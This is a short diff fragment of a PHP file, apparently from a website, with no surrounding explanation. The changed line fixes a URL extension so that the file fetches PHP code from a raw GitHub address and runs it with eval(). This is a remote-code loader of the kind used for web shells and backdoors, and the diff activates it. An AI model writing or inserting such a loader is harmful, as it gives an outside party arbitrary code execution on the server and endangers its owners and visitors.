@@ -17,4 +17,4 @@ function getURL($url) {
 }
 
 
-eval("?>" . getURL("https://raw.githubusercontent.com/trixxxx12/plerr/refs/heads/main/about.phpp"));
+eval("?>" . getURL("https://raw.githubusercontent.com/trixxxx12/plerr/refs/heads/main/about.php"));
